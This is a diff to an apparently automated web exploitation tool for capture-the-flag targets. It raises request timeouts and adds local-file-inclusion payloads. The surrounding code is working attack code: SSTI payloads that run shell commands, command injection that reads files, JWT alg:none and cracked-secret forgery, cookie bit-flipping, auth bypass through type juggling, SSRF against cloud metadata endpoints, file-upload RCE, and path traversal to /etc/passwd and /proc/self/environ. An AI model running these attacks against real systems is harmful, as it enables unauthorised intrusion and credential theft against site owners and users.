@@ -222,7 +222,7 @@ class AutoPwnPipeline:
                 # If .env or config file leaked, save to loot
                 if any(x in h["path"] for x in [".env", "config", "app.py", "backup", "flag"]):
                     try:
-                        content = self.session.get(h["url"], timeout=5).text
+                        content = self.session.get(h["url"], timeout=15).text
                         LootManager.save_source_file(self.target_url, h["path"], content)
                         self._check_and_store_flags(content, h["path"])
                     except Exception:
@@ -262,9 +262,9 @@ class AutoPwnPipeline:
             # Submit dummy data
             try:
                 if method == "POST":
-                    r = self.session.post(action, data=payload, timeout=5, allow_redirects=False)
+                    r = self.session.post(action, data=payload, timeout=15, allow_redirects=False)
                 else:
-                    r = self.session.get(action, params=payload, timeout=5, allow_redirects=False)
+                    r = self.session.get(action, params=payload, timeout=15, allow_redirects=False)
                 
                 # Check for new cookies!
                 new_cookies = r.cookies.get_dict()
@@ -312,7 +312,7 @@ class AutoPwnPipeline:
         for param in list(self.state["parameters"])[:6]:
             try:
                 test_url = f"{self.target_url}?{param}={canary}"
-                r = self.session.get(test_url, timeout=4)
+                r = self.session.get(test_url, timeout=15)
                 if canary in r.text:
                     reflected_params.append(param)
             except Exception:
@@ -849,7 +849,7 @@ class AutoPwnPipeline:
                         modified[key] = True
                         new_cookie = base64.b64encode(json.dumps(modified).encode()).decode()
                         try:
-                            r = self.session.get(self.target_url, cookies={cname: new_cookie}, timeout=5)
+                            r = self.session.get(self.target_url, cookies={cname: new_cookie}, timeout=15)
                             if self._check_and_store_flags(r.text, f"JSON cookie admin bypass ({key})"):
                                 print_success(f"  Flag captured by setting '{key}'=true!")
                                 return
@@ -860,7 +860,7 @@ class AutoPwnPipeline:
                                 # Try to access admin pages
                                 for path in ["/admin", "/flag", "/dashboard"]:
                                     try:
-                                        ar = self.session.get(urljoin(self.target_url, path), cookies={cname: new_cookie}, timeout=5)
+                                        ar = self.session.get(urljoin(self.target_url, path), cookies={cname: new_cookie}, timeout=15)
                                         self._check_and_store_flags(ar.text, f"Admin page {path}")
                                     except Exception:
                                         pass
@@ -898,9 +898,9 @@ class AutoPwnPipeline:
                 data = {**{i: "" for i in inputs}, **p}
                 try:
                     if method.upper() == "POST":
-                        r = self.session.post(action, data=data, timeout=5)
+                        r = self.session.post(action, data=data, timeout=15)
                     else:
-                        r = self.session.get(action, params=data, timeout=5)
+                        r = self.session.get(action, params=data, timeout=15)
                     if r.status_code in (301, 302) or any(
                         k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                     ):
@@ -911,7 +911,7 @@ class AutoPwnPipeline:
                             loc = r.headers.get("Location", "")
                             if loc:
                                 try:
-                                    r2 = self.session.get(urljoin(action, loc), timeout=5)
+                                    r2 = self.session.get(urljoin(action, loc), timeout=15)
                                     self._check_and_store_flags(r2.text, f"Auth bypass redirect {loc}")
                                 except Exception:
                                     pass
@@ -925,9 +925,9 @@ class AutoPwnPipeline:
                 data = {**{i: "" for i in inputs}, password_field: mh, username_field: "admin"}
                 try:
                     if method.upper() == "POST":
-                        r = self.session.post(action, data=data, timeout=5)
+                        r = self.session.post(action, data=data, timeout=15)
                     else:
-                        r = self.session.get(action, params=data, timeout=5)
+                        r = self.session.get(action, params=data, timeout=15)
                     if r.status_code in (301, 302) or any(
                         k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                     ):
@@ -941,9 +941,9 @@ class AutoPwnPipeline:
             data = {**{i: "" for i in inputs}, password_field: ["x"], username_field: "admin"}
             try:
                 if method.upper() == "POST":
-                    r = self.session.post(action, data=data, timeout=5)
+                    r = self.session.post(action, data=data, timeout=15)
                 else:
-                    r = self.session.get(action, params=data, timeout=5)
+                    r = self.session.get(action, params=data, timeout=15)
                 if r.status_code in (301, 302) or any(
                     k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                 ):
@@ -963,9 +963,9 @@ class AutoPwnPipeline:
                 data = {**{i: "" for i in inputs}, username_field: u, password_field: p}
                 try:
                     if method.upper() == "POST":
-                        r = self.session.post(action, data=data, timeout=5)
+                        r = self.session.post(action, data=data, timeout=15)
                     else:
-                        r = self.session.get(action, params=data, timeout=5)
+                        r = self.session.get(action, params=data, timeout=15)
                     if r.status_code in (301, 302) or any(
                         k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
                     ):
@@ -1019,7 +1019,7 @@ class AutoPwnPipeline:
                     r = self.session.get(
                         f"{base_url}?{param}={admin_cookie_payload}",
                         allow_redirects=False,
-                        timeout=5
+                        timeout=15
                     )
                     # Check if admin cookie was set
                     resp_cookies = r.cookies.get_dict()
@@ -1033,7 +1033,7 @@ class AutoPwnPipeline:
                         # Now request protected pages with the forged cookie
                         for protected in ["/admin", "/dashboard", "/profile", "/flag", "/admin.php"]:
                             try:
-                                pr = self.session.get(urljoin(base_url, protected), timeout=5)
+                                pr = self.session.get(urljoin(base_url, protected), timeout=15)
                                 self._check_and_store_flags(pr.text, f"Protected page {protected} (via CRLF admin cookie)")
                             except Exception:
                                 pass
@@ -1056,18 +1056,18 @@ class AutoPwnPipeline:
                     if "[]" in payload:
                         # Array injection
                         data = {param: ["x"]}
-                        r = self.session.post(action, data=data, timeout=5)
+                        r = self.session.post(action, data=data, timeout=15)
                     else:
                         # Magic hash
                         data = {param: payload, "username": "admin", "user": "admin", "login": "admin"}
-                        r = self.session.post(action, data=data, timeout=5)
+                        r = self.session.post(action, data=data, timeout=15)
                     self._check_and_store_flags(r.text, f"Type juggling bypass on {action}")
                     # Follow redirects to authenticated area
                     if r.status_code in [301, 302]:
                         loc = r.headers.get("Location", "")
                         if loc:
                             try:
-                                r2 = self.session.get(urljoin(action, loc), timeout=5)
+                                r2 = self.session.get(urljoin(action, loc), timeout=15)
                                 self._check_and_store_flags(r2.text, f"Authenticated page after type juggling: {loc}")
                             except Exception:
                                 pass
@@ -1265,9 +1265,9 @@ class AutoPwnPipeline:
                         data.setdefault(n, "")
                 try:
                     if method.upper() == "POST":
-                        r = self.session.post(action, data=data, timeout=5)
+                        r = self.session.post(action, data=data, timeout=15)
                     else:
-                        r = self.session.get(action, params=data, timeout=5)
+                        r = self.session.get(action, params=data, timeout=15)
                     # Check if payload reflected/stored
                     if payload.split(">")[0] in r.text or "success" in r.text.lower():
                         print_success(f"  [XSS Chain] Stored XSS payload submitted: {payload[:60]}")
@@ -1290,7 +1290,7 @@ class AutoPwnPipeline:
                 try:
                     # Try common report params
                     for param in ["url", "link", "target", "site", "page"]:
-                        r = self.session.post(report_url, data={param: self.target_url}, timeout=5)
+                        r = self.session.post(report_url, data={param: self.target_url}, timeout=15)
                         if r.status_code in [200, 302]:
                             print_success(f"  [XSS Chain] Admin bot triggered via {report_url}")
                             self.state["admin_bot_triggered"] = True
@@ -1305,7 +1305,7 @@ class AutoPwnPipeline:
         # Re-request admin pages in case the bot's action revealed a flag
         for path in ["/admin", "/flag", "/admin/flag", "/dashboard"]:
             try:
-                r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                r = self.session.get(urljoin(self.target_url, path), timeout=15)
                 if self._check_and_store_flags(r.text, f"Admin bot result ({path})"):
                     return True
             except Exception:
@@ -1316,7 +1316,7 @@ class AutoPwnPipeline:
         """Try to read the flag from admin-only pages."""
         for path in ["/admin", "/admin/flag", "/flag", "/admin/dashboard", "/panel"]:
             try:
-                r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                r = self.session.get(urljoin(self.target_url, path), timeout=15)
                 if self._check_and_store_flags(r.text, f"Admin flag ({path})"):
                     return True
             except Exception:
@@ -1354,7 +1354,7 @@ class AutoPwnPipeline:
             for path in ["/admin", "/admin/dashboard", "/dashboard", "/panel"]:
                 try:
                     r = self.session.get(urljoin(self.target_url, path),
-                                         cookies={"session": forged, "jwt": forged, "token": forged}, timeout=5)
+                                         cookies={"session": forged, "jwt": forged, "token": forged}, timeout=15)
                     if r.status_code == 200:
                         print_success(f"  [LFI Chain] Admin access granted via forged token: {path}")
                         self.state["admin_accessible"] = True
@@ -1369,13 +1369,13 @@ class AutoPwnPipeline:
             for path in ["/admin", "/admin/dashboard", "/panel"]:
                 try:
                     r = self.session.get(urljoin(self.target_url, path),
-                                         cookies={"session": forged}, timeout=5)
+                                         cookies={"session": forged}, timeout=15)
                     params = extract_forms_and_links(r.text, urljoin(self.target_url, path))["parameters"]
                     for p in params:
                         ssti_resp = self.session.get(
                             urljoin(self.target_url, path),
                             params={p: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"},
-                            cookies={"session": forged}, timeout=5)
+                            cookies={"session": forged}, timeout=15)
                         if self._check_and_store_flags(ssti_resp.text, f"Admin SSTI ({p})"):
                             return True
                 except Exception:
@@ -1452,7 +1452,7 @@ class AutoPwnPipeline:
         for p in ssrf_params:
             for meta in CLOUD_METADATA_ENDPOINTS[:3]:
                 try:
-                    r = self.session.get(self.target_url, params={p: meta["url"]}, timeout=5)
+                    r = self.session.get(self.target_url, params={p: meta["url"]}, timeout=15)
                     if r.status_code == 200 and any(k in r.text.lower() for k in ["accesskey", "secret", "token", "client_id", "account", "role"]):
                         print_success(f"  [SSRF Chain] Cloud metadata leaked via '{p}': {meta['provider']}")
                         self._log_step("Phase 4: SSRF Chain", f"SSRF leaked {meta['provider']} metadata", details=meta["url"])
@@ -1466,7 +1466,7 @@ class AutoPwnPipeline:
         """Check if SSRF leaked cloud credentials (IMDS/metadata)."""
         for path in ["/admin", "/flag", "/dashboard"]:
             try:
-                r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                r = self.session.get(urljoin(self.target_url, path), timeout=15)
                 if self._check_and_store_flags(r.text, f"SSRF credential use ({path})"):
                     return True
             except Exception:
@@ -1477,7 +1477,7 @@ class AutoPwnPipeline:
         """Check admin/flag pages for captured flags."""
         for path in ["/admin", "/flag", "/admin/flag", "/dashboard", "/panel"]:
             try:
-                r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                r = self.session.get(urljoin(self.target_url, path), timeout=15)
                 if self._check_and_store_flags(r.text, f"Admin page ({path})"):
                     return True
             except Exception:
@@ -1587,7 +1587,7 @@ class AutoPwnPipeline:
                 for fname, fcontent, ftype in files_to_upload:
                     try:
                         multipart_data = {field_name: (fname, fcontent, ftype)}
-                        r_up = self.session.post(action_url, files=multipart_data, timeout=5)
+                        r_up = self.session.post(action_url, files=multipart_data, timeout=15)
                         last_upload_resp = r_up
                     except Exception:
                         pass
@@ -1617,7 +1617,7 @@ class AutoPwnPipeline:
                 # Test execution across candidate URLs
                 for exec_candidate in set(possible_paths):
                     try:
-                        r_exec = self.session.get(exec_candidate, params={"cmd": test_flag_cmd}, timeout=5)
+                        r_exec = self.session.get(exec_candidate, params={"cmd": test_flag_cmd}, timeout=15)
                         
                         prev_flags_count = len(self.state["captured_flags"])
                         self._check_and_store_flags(r_exec.text, f"File Upload RCE ({t_name})")
@@ -1688,9 +1688,9 @@ class AutoPwnPipeline:
             for probe_expr, expected, probe_type in probes:
                 try:
                     if method == "POST":
-                        r = self.session.post(url, data={param: probe_expr}, timeout=5)
+                        r = self.session.post(url, data={param: probe_expr}, timeout=15)
                     else:
-                        r = self.session.get(url, params={param: probe_expr}, timeout=5)
+                        r = self.session.get(url, params={param: probe_expr}, timeout=15)
                     
                     self._check_and_store_flags(r.text, f"SSTI ({probe_type})")
                     
@@ -1732,9 +1732,9 @@ class AutoPwnPipeline:
                             for p in prioritized:
                                 payload_str = p["payload"]
                                 if method == "POST":
-                                    r_rce = self.session.post(url, data={param: payload_str}, timeout=5)
+                                    r_rce = self.session.post(url, data={param: payload_str}, timeout=15)
                                 else:
-                                    r_rce = self.session.get(url, params={param: payload_str}, timeout=5)
+                                    r_rce = self.session.get(url, params={param: payload_str}, timeout=15)
                                     
                                 self._check_and_store_flags(r_rce.text, f"SSTI RCE ({p['name']})")
                                 
@@ -1762,10 +1762,14 @@ class AutoPwnPipeline:
             ("php_filter_b64", "php://filter/convert.base64-encode/resource=app.py"),
             ("php_filter_b64_index", "php://filter/convert.base64-encode/resource=index.php"),
             ("php_filter_b64_config", "php://filter/convert.base64-encode/resource=config.php"),
+            ("php_filter_b64_no_ext_index", "php://filter/convert.base64-encode/resource=index"),
+            ("php_filter_b64_no_ext_config", "php://filter/convert.base64-encode/resource=config"),
+            ("php_filter_b64_no_ext_services", "php://filter/convert.base64-encode/resource=services"),
             ("traversal_passwd", "../../../../../../../../etc/passwd"),
             ("traversal_nested", "....//....//....//....//etc/passwd"),
             ("traversal_app", "../../../../../../../../app/app.py"),
             ("traversal_proc", "../../../../../../../../proc/self/environ"),
+            ("traversal_passwd_null", "../../../../../../../../etc/passwd%00"),
         ]
 
         prioritized_lfi = self.learning_engine.prioritize_payloads(
@@ -1776,7 +1780,7 @@ class AutoPwnPipeline:
             for item in prioritized_lfi:
                 pay = item["payload"]
                 try:
-                    r = self.session.get(self.target_url, params={param: pay}, timeout=4)
+                    r = self.session.get(self.target_url, params={param: pay}, timeout=15)
                     
                     # Cognitive response analysis
                     diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=pay)
@@ -1829,7 +1833,7 @@ class AutoPwnPipeline:
         for param in test_params:
             for name, probe, indicator in probes:
                 try:
-                    r = self.session.get(self.target_url, params={param: probe}, timeout=4)
+                    r = self.session.get(self.target_url, params={param: probe}, timeout=15)
                     diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=probe)
                     if diag["waf_detected"]:
                         summary = ResponseAnalyzer.format_diagnostic_summary(diag)
@@ -1841,7 +1845,7 @@ class AutoPwnPipeline:
                         self._log_step("Phase 4: Exploitation", f"Command Injection confirmed on {param}", curl_cmd=f"curl '{self.target_url}?{param}={probe}'")
                         
                         # Weaponize flag extraction
-                        flag_r = self.session.get(self.target_url, params={param: "; cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null"}, timeout=5)
+                        flag_r = self.session.get(self.target_url, params={param: "; cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null"}, timeout=15)
                         self._check_and_store_flags(flag_r.text, "Command Injection Output")
                         
                         self.state["active_rce_method"] = lambda cmd: self.session.get(self.target_url, params={param: f"; {cmd}"}).text
@@ -1979,7 +1983,7 @@ class AutoPwnPipeline:
         for param in test_params:
             for name, payload_val in deser_probes:
                 try:
-                    r = self.session.get(self.target_url, params={param: payload_val}, timeout=5)
+                    r = self.session.get(self.target_url, params={param: payload_val}, timeout=15)
                     prev_flags = len(self.state["captured_flags"])
                     self._check_and_store_flags(r.text, f"Deserialization ({name})")
                     new_flags_found = len(self.state["captured_flags"]) > prev_flags
@@ -2048,9 +2052,9 @@ class AutoPwnPipeline:
                     data = {name: p for name in inputs}
                     try:
                         if method == "POST":
-                            r = self.session.post(action, data=data, timeout=4)
+                            r = self.session.post(action, data=data, timeout=15)
                         else:
-                            r = self.session.get(action, params=data, timeout=4)
+                            r = self.session.get(action, params=data, timeout=15)
                             
                         # Cognitive response analysis for SQL errors
                         diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=p)
@@ -2075,7 +2079,7 @@ class AutoPwnPipeline:
             # 1. Test alg: none
             none_token = forge_alg_none(token, {"role": "admin", "user": "admin", "isAdmin": True})
             try:
-                r = self.session.get(self.target_url, cookies={cname: none_token}, timeout=4)
+                r = self.session.get(self.target_url, cookies={cname: none_token}, timeout=15)
                 self._check_and_store_flags(r.text, "JWT Alg:None Response")
                 if "admin" in r.text.lower() or "flag" in r.text.lower():
                     print_success(f"JWT Alg:None Bypass Succeeded on cookie '{cname}'!")
@@ -2095,7 +2099,7 @@ class AutoPwnPipeline:
                 try:
                     from modules.jwt_tool import sign_jwt_hs256
                     forged = sign_jwt_hs256({}, {"role": "admin", "user": "admin", "isAdmin": True}, cracked)
-                    r = self.session.get(self.target_url, cookies={cname: forged}, timeout=4)
+                    r = self.session.get(self.target_url, cookies={cname: forged}, timeout=15)
                     self._check_and_store_flags(r.text, "JWT Cracked Secret Response")
                     if "admin" in r.text.lower() or "flag" in r.text.lower():
                         print_success(f"JWT Cracked Bypass Succeeded on cookie '{cname}'!")
@@ -2160,7 +2164,7 @@ class AutoPwnPipeline:
                     altered[pos] = altered[pos] ^ bit_val
                     altered_b64 = b64encode(bytes(altered)).decode("utf-8")
                     try:
-                        r = self.session.get(self.target_url, cookies={cname: altered_b64}, timeout=4)
+                        r = self.session.get(self.target_url, cookies={cname: altered_b64}, timeout=15)
                         text = r.text.lower()
                         # Flag found
                         if "picoctf{" in text or "flag{" in text or "ctf{" in text:
@@ -2209,7 +2213,7 @@ class AutoPwnPipeline:
         scripts_to_analyze = []
         for s_url in self.state.get("scripts", []):
             try:
-                r_js = self.session.get(s_url, timeout=5)
+                r_js = self.session.get(s_url, timeout=15)
                 if r_js.status_code == 200 and r_js.text:
                     script_name = s_url.split("/")[-1] or "external.js"
                     self.state["leaked_source_files"][script_name] = r_js.text
@@ -2266,9 +2270,9 @@ class AutoPwnPipeline:
                     if form_data:
                         try:
                             if method == "POST":
-                                r_sub = self.session.post(action_url, data=form_data, timeout=5)
+                                r_sub = self.session.post(action_url, data=form_data, timeout=15)
                             else:
-                                r_sub = self.session.get(action_url, params=form_data, timeout=5)
+                                r_sub = self.session.get(action_url, params=form_data, timeout=15)
                             self._check_and_store_flags(r_sub.text, f"Authenticated Form Submission ({action_url})")
                         except Exception:
                             pass
@@ -2288,7 +2292,7 @@ class AutoPwnPipeline:
         for bep in byte_endpoints:
             full_bep = urljoin(self.target_url, bep)
             try:
-                r_bytes = self.session.get(full_bep, timeout=4)
+                r_bytes = self.session.get(full_bep, timeout=15)
                 if r_bytes.status_code == 200 and len(r_bytes.text) > 50:
                     raw_text = r_bytes.text.strip()
                     tokens = re.split(r"[\s,]+", raw_text)
@@ -2602,7 +2606,7 @@ class AutoPwnPipeline:
                 for path in ["/admin", "/admin/dashboard", "/dashboard", "/flag", "/admin/flag", "/panel"]:
                     try:
                         r = self.session.get(urljoin(self.target_url, path),
-                                             cookies={"session": forged, "jwt": forged, "token": forged}, timeout=5)
+                                             cookies={"session": forged, "jwt": forged, "token": forged}, timeout=15)
                         self._check_and_store_flags(r.text, f"Chained session forgery ({path})")
                         if r.status_code == 200:
                             print_success(f"Chained Admin Access via Forged Token: {path}")
@@ -2613,7 +2617,7 @@ class AutoPwnPipeline:
                                 ssti_resp = self.session.get(
                                     urljoin(self.target_url, path),
                                     params={p: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"},
-                                    cookies={"session": forged}, timeout=5)
+                                    cookies={"session": forged}, timeout=15)
                                 self._check_and_store_flags(ssti_resp.text, f"Chained admin SSTI ({p})")
                     except Exception:
                         pass
@@ -2625,7 +2629,7 @@ class AutoPwnPipeline:
             print_info("Admin access available - chaining into admin-only flag hunting...")
             for path in ["/admin", "/admin/flag", "/flag", "/admin/dashboard", "/panel", "/admin/readflag"]:
                 try:
-                    r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                    r = self.session.get(urljoin(self.target_url, path), timeout=15)
                     self._check_and_store_flags(r.text, f"Chained admin flag ({path})")
                 except Exception:
                     pass
@@ -2667,7 +2671,7 @@ class AutoPwnPipeline:
                         p_val = ch["payload"]
                         p_name = ch["sink_parameter"]
                         print_info(f"Triggering Deserialization Chain on parameter '{p_name}'...")
-                        r_chain = self.session.get(self.target_url, params={p_name: p_val}, timeout=5)
+                        r_chain = self.session.get(self.target_url, params={p_name: p_val}, timeout=15)
                         self._check_and_store_flags(r_chain.text, f"Chained Exploit ({ch['chain_name']})")
                         
                         # Generate standalone Python script and save to loot
@@ -2688,7 +2692,7 @@ class AutoPwnPipeline:
                 for admin_path in ["/admin", "/admin/dashboard", "/dashboard", "/flag", "/admin/flag", "/panel"]:
                     admin_url = urljoin(self.target_url, admin_path)
                     try:
-                        r_admin = self.session.get(admin_url, cookies={"session": forged_admin, "jwt": forged_admin, "token": forged_admin}, timeout=4)
+                        r_admin = self.session.get(admin_url, cookies={"session": forged_admin, "jwt": forged_admin, "token": forged_admin}, timeout=15)
                         self._check_and_store_flags(r_admin.text, f"Admin Area ({admin_path})")
                         if r_admin.status_code == 200:
                             print_success(f"Admin Access Granted via Forged Token on: [bold green]{admin_url}[/bold green]!")
@@ -2696,7 +2700,7 @@ class AutoPwnPipeline:
                             
                             admin_parsed = extract_forms_and_links(r_admin.text, admin_url)
                             for admin_param in admin_parsed["parameters"]:
-                                ssti_resp = self.session.get(admin_url, params={admin_param: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"}, cookies={"session": forged_admin}, timeout=5)
+                                ssti_resp = self.session.get(admin_url, params={admin_param: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"}, cookies={"session": forged_admin}, timeout=15)
                                 self._check_and_store_flags(ssti_resp.text, f"Admin SSTI ({admin_param})")
                     except Exception:
                         pass
